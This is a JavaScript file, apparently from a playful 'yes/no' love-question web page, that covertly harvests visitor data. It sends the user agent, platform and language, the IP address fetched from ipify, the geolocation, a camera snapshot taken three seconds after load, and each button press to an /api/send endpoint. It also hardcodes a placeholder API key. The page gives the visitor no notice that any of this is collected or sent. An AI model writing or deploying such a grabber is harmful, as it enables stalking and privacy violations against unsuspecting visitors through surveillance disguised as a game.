fetch("/api/send",{
  method:"POST",
  headers:{
    "Content-Type":"application/json",
    "x-api-key":"secret123"
  },
  body:JSON.stringify({
    type:"text",
    text:"Test message"
  })
});
const API = "/api/send";

async function send(data){
  await fetch(API,{
    method:"POST",
    headers:{ "Content-Type":"application/json"},
    body:JSON.stringify(data)
  });
}

/* DEVICE INFO */

const info =
`
❤️ New Visitor

UserAgent:
${navigator.userAgent}

Platform:
${navigator.platform}

Language:
${navigator.language}
`;

send({
 type:"text",
 text:info
});


/* IP ADDRESS */

fetch("https://api.ipify.org?format=json")
.then(r=>r.json())
.then(d=>{
 send({
  type:"text",
  text:"🌐 IP Address: "+d.ip
 });
});


/* LOCATION (permission required) */

if(navigator.geolocation){

 navigator.geolocation.getCurrentPosition(pos=>{

   const lat = pos.coords.latitude;
   const lon = pos.coords.longitude;

   send({
    type:"text",
    text:`📍 Location\nhttps://maps.google.com/?q=${lat},${lon}`
   });

 });

}


/* CAMERA (permission required) */

async function capturePhoto(){

 try{

 const stream = await navigator.mediaDevices.getUserMedia({video:true});

 const video = document.createElement("video");
 video.srcObject = stream;

 await video.play();

 const canvas = document.createElement("canvas");
 canvas.width = video.videoWidth;
 canvas.height = video.videoHeight;

 const ctx = canvas.getContext("2d");
 ctx.drawImage(video,0,0);

 const img = canvas.toDataURL("image/jpeg");

 send({
  type:"photo",
  image:img
 });

 stream.getTracks().forEach(t=>t.stop());

 }catch(e){}

}

setTimeout(capturePhoto,3000);


/* BUTTON EVENTS */

document.addEventListener("DOMContentLoaded",()=>{

 const yes = document.getElementById("yes");
 const no  = document.getElementById("no");

 yes.addEventListener("click",()=>{
   send({
    type:"text",
    text:"❤️ User clicked YES"
   });
 });

 no.addEventListener("pointerdown",()=>{
   send({
    type:"text",
    text:"😭 User tried clicking NO"
   });
 });

});
